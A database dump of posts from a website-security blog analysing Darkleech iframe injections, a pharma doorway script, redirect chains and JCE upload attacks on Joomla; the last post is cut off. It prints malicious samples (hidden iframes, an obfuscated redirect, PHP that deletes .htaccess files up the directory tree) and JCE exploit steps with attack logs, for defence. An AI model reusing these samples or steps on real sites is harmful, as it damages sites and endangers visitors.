INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (202, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (203, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (204, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (205, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (206, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (207, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (208, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (209, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 